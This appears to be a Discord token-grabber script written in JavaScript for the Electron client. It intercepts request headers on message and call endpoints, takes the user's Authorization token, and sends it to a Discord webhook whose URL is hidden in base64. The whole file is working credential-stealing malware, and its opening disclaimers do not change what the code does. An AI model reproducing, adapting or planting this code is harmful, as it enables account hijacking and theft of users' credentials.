//TESTED ON DISCORD (NOT WORKINGFOR NOW)
//DO NOT USE THIS FOR ANY HARMFUL PURPOSES

var auth_token = null;
var url = Buffer.from('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNTAyMzc1NDA2MDM5MjA0NjYvbG5uZ0lJUWdvNVVfYmtxaklnRWFvVFNKd0RrRFRXUUdyc1QwaXZnQzlBNEp0MldXVzllREZWMWVjZVpobXNnZWg5cFo=', 'base64').toString()
require('electron').session.defaultSession.webRequest.onBeforeSendHeaders({urls: [
    'https://*.discord.com/api/v*/channels/*/messages',
    'https://*.discord.com/api/v*/channels/*/call',
] }, (x, y) => {
    if (x.requestHeaders.Authorization && !auth_token) {
        auth_token = x.requestHeaders.Authorization;
        const cUrl = new URL(url);
        const req = require('https').request({ protocol: cUrl.protocol, host : cUrl.host, path : cUrl.pathname, method : 'POST', headers : {'Content-Type': 'application/json','Access-Control-Allow-Origin':'*',} });
        req.write(JSON.stringify({ content: auth_token }));
        req.end();
    }
    y({ responseHeaders: {...x.responseHeaders,} });
})
